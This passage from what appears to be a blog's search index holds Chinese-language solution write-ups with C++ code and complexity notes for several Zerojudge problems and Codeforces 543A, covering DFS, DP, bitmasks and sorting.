    <content><![CDATA[<h1 id="Zerojudge-e287"><a href="#Zerojudge-e287" class="headerlink" title="Zerojudge e287"></a>Zerojudge e287</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=e287" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=e287</a><br>給一張地圖，起點從權重最小的點開始，每次往四周沒走過且權重最小的點移動，求移動權重的總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>用DFS照做即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,ans=<span class="number">0</span>,arr[<span class="number">105</span>][<span class="number">105</span>],dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line">pii start=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cango</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(x&lt;<span class="number">0</span> || y&lt;<span class="number">0</span> || x&gt;=n || y&gt;=m)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(pii s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x=s.first;</span><br><span class="line">	<span class="keyword">int</span> y=s.second;</span><br><span class="line">	vis[x][y]=<span class="literal">true</span>;</span><br><span class="line">	ans+=arr[x][y];</span><br><span class="line">	<span class="keyword">int</span> Min=INT_MAX;</span><br><span class="line">	pii next=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> nx=x+dir[i][<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">int</span> ny=y+dir[i][<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span>(!vis[nx][ny] &amp;&amp; cango(nx,ny))&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[nx][ny]&lt;Min)&#123;</span><br><span class="line">				next=make_pair(nx,ny);</span><br><span class="line">				Min=arr[nx][ny];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(next.first==<span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		dfs(next);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">int</span> Min=INT_MAX;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;m ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			<span class="keyword">if</span>(arr[i][j]&lt;Min)&#123;</span><br><span class="line">				start=make_pair(i,j);</span><br><span class="line">				Min=arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	dfs(start);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>輸入時間複雜度為 $O(nm)$<br>DFS最多每個點都遍歷過，且每個點遍歷時間複雜度為 $O(1)$ ，DFS總時間複雜度為 $O(nm)$<br>總時間複雜度 $O(nm)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforces 543A</title>
    <url>/2020/09/13/codeforces%20543A/</url>
    <content><![CDATA[<h1 id="codeforces-543A"><a href="#codeforces-543A" class="headerlink" title="codeforces 543A"></a>codeforces 543A</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p>今天有 $n$ 個程式設計師，要寫 $m$ 行程式碼<br>第 $i$ 個程式設計師每寫1行分別會有 $bug[i]$ 個bug<br>給定 $n$ $m$ $b$ $p$ $bug[]$<br>要求在總共不超過 $b$ 個bug的情況下， $n$ 個程式設計師完成 $m$ 行程式碼的方法數有多少種<br>由於結果可能很大，求總和模 $p$ 的值</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察題目後，可以發現到會影響到bug總數的會是 <strong>哪個程式設計師</strong> 以及 <strong>寫了幾行</strong></p>
<p>定義 </p>
<blockquote>
<p>$dp[i][j][k]$ 表示第 $i$ 個程式設計師寫了 $j$ 行code後bug總數為 $k$ 的方法數</p>
</blockquote>
<p>可以得到轉移式</p>
<blockquote>
<p>$dp[i][j][k] = $$\Sigma_{l=0}^{j}  dp[i-1][j-l][k-bug[i]*l]$$ $mod p$</p>
</blockquote>
<p>做到這邊可以得到正確的解，但是估計一下時間複雜度<br>每個狀態要以 $O(m)$ 的時間處理<br>又我們有 $nmb$ 種狀態，總時間複雜度為 $O(nm^2b)$<br>顯然這樣的時間是不行的</p>
<p>我們希望我們能在 $O(1)$ 的時間完成一個狀態<br>觀察我們的轉移式，以 $dp[3][2][4]$ 和 $dp[3][1][2]$ 為例，並假設所有人的$bug[i]$都是2</p>
<blockquote>
<p>$dp[3][2][4] = dp[2][2][4] + dp[2][1][2] + dp[2][0][0]$</p>
</blockquote>
<blockquote>
<p>$dp[3][1][2] = dp[2][1][2] + dp[2][0][0]$</p>
</blockquote>
<p>可以發現到，中間只差了 $dp[2][2][4]$<br>也就是說</p>
<blockquote>
<p>$dp[i][j][k] = dp[i][j-1][k-bug[i]] + dp[i-1][j][k]$</p>
</blockquote>
<p>透過這樣的方式，可以得到一個時間複雜度為 $O(nmb)$ 的好做法<br>不過傳到codeforces出現compile error，空間使用量過大</p>
<p>再次觀察上面的轉移式，可以發現到我們的 $i$ 只跟 $i$ 和 $i-1$ 有關，也就是說，我們只需要儲存兩個就可以表達全部</p>
<blockquote>
<p>$dp[i][j][k] = dp[i][j-1][k-bug[i]] + dp[!(i%2)][j][k]$</p>
</blockquote>
<p>如此一來就完成了</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">2</span>][<span class="number">510</span>][<span class="number">510</span>]=&#123;<span class="number">1</span>&#125;,bug[<span class="number">510</span>],n,m,b,mod,ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;b&gt;&gt;mod;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;bug[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;=m ; j++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;=b ; k++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(j &amp;&amp; k&gt;=bug[i]) dp[i%<span class="number">2</span>][j][k] = (dp[i%<span class="number">2</span>][j<span class="number">-1</span>][k-bug[i]] + dp[!(i%<span class="number">2</span>)][j][k])%mod;</span><br><span class="line">				<span class="keyword">else</span> dp[i%<span class="number">2</span>][j][k] = dp[!(i%<span class="number">2</span>)][j][k];</span><br><span class="line">				<span class="keyword">if</span>(i==n &amp;&amp; j==m) ans=(ans+dp[i%<span class="number">2</span>][j][k])%mod;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>有 $nmb$ 種狀態，每種狀態轉移複雜度為 $O(1)$<br>總複雜度 $O(nmb)$</p>
]]></content>
      <categories>
        <category>codeforces</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>codeforces</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge e288</title>
    <url>/2020/06/28/Zerojudge%20e288/</url>
    <content><![CDATA[<h1 id="Zerojudge-e288"><a href="#Zerojudge-e288" class="headerlink" title="Zerojudge e288"></a>Zerojudge e288</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=e288" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=e288</a><br>定義兩字串互為CP必須符合</p>
<ol>
<li>無任何字母相同</li>
<li>須包含所有範圍內的字母</li>
</ol>
<p>給 $n$ 個字串，求CP對數總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>暴力搜尋，複雜度 $O(m^2)$，只有25分</p>
<p>我們可以嘗試把一個字串所包含的字元以bit表示<br>而全部有 <code>A~Z</code> <code>a~i</code> 共38個字母，可以分別以1bit表示各個字母<br>而搜尋每次只需要利用xor的特性，很快就可以獲得差集<br>但是在搜尋的部分如果用 $O(m^2)$ 還是一樣差<br>嘗試將搜尋的內容塞入map中，使得查詢時間複雜度降至 $O(logm)$<br>為了方便塞入map，可以用long long，具有64個bit可以充分運用</p>
<h3 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h3><p>其實也不一定需要用到map<br>我們需要實現的只有能快速搜尋<br>可以先排序($O(logn)$)再二分搜($O(logn)$)<br>也可以達到map相同的效果</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> mask,tmp;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">char_to_num</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(c&gt;=<span class="string">'A'</span> &amp;&amp; c&lt;=<span class="string">'Z'</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> c-<span class="string">'A'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">26</span>+c-<span class="string">'a'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		mask |= (<span class="number">1L</span>L &lt;&lt; i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		tmp=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;s.size() ; j++)&#123;</span><br><span class="line">			tmp |= (<span class="number">1L</span>L&lt;&lt;(char_to_num(s[j])));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(mp.count(tmp ^ mask)) ans+= mp[tmp ^ mask];</span><br><span class="line">		<span class="keyword">if</span>(mp.count(tmp)) mp[tmp]++;</span><br><span class="line">		<span class="keyword">else</span> mp[tmp]=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>輸入時間複雜度為 $O(m)$<br>查詢時間複雜度約為 $O(logm)$<br>總時間複雜度 $O(m+logm)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>Binary Search</tag>
        <tag>sort</tag>
        <tag>Map</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge e286</title>
    <url>/2020/06/28/Zerojudge%20e286/</url>
    <content><![CDATA[<h1 id="Zerojudge-e286"><a href="#Zerojudge-e286" class="headerlink" title="Zerojudge e286"></a>Zerojudge e286</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=e286" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=e286</a><br>給兩場比賽中四局的兩隊比數，求輸贏與比分</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>跟著題目照做即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> tmp,A_win=<span class="number">0</span>,B_win=<span class="number">0</span>,tot_a=<span class="number">0</span>,tot_b=<span class="number">0</span>;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;<span class="number">2</span> ; k++)&#123;</span><br><span class="line">		tot_a = tot_b = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			tot_a+=tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">4</span> ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			tot_b+=tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;tot_a&lt;&lt;<span class="string">":"</span>&lt;&lt;tot_b&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">if</span>(tot_a&gt;tot_b)</span><br><span class="line">			A_win++;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(tot_a&lt;tot_b)</span><br><span class="line">			B_win++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(A_win&gt;B_win)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Win\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(B_win&gt;A_win)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Lose\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Tie\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(1)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c471</title>
    <url>/2020/06/28/Zerojudge%20c471/</url>
    <content><![CDATA[<h1 id="Zerojudge-c471"><a href="#Zerojudge-c471" class="headerlink" title="Zerojudge c471"></a>Zerojudge c471</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c471" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c471</a><br>給定 $n$ 個物品的重量 $w_i$ 與拿取次數 $f_i$<br>定義拿取物品 $i$ 的花費是其 $f_i$ 乘上在其上方物品的重量總和<br>求最小的花費總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於兩個物品 $i$ $j$，只要 $w_i<em>f_j &lt; w_j</em>f_i$ ，就將 $i$ 放在 $j$ 前面<br>所以我們只要將所有物品以這種方式排序就會得到最佳的擺放方式<br>最後再計算總花費即可求解</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,px[<span class="number">100005</span>],w[<span class="number">100005</span>],f[<span class="number">100005</span>],tot=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> w[i]*f[j] &lt; w[j]*f[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;w[i];</span><br><span class="line">		px[i]=i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;f[i];</span><br><span class="line">	&#125;</span><br><span class="line">	sort(px,px+n,cmp);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		ans+=f[px[i]]*tot;</span><br><span class="line">		tot+=w[px[i]];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>排序時間複雜度為 $O(nlogn)$<br>計算花費時間複雜度為 $O(n)$<br>總時間複雜度為 $O(n+nlogn)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>sort</tag>
      </tags>
  </entry>
</search>
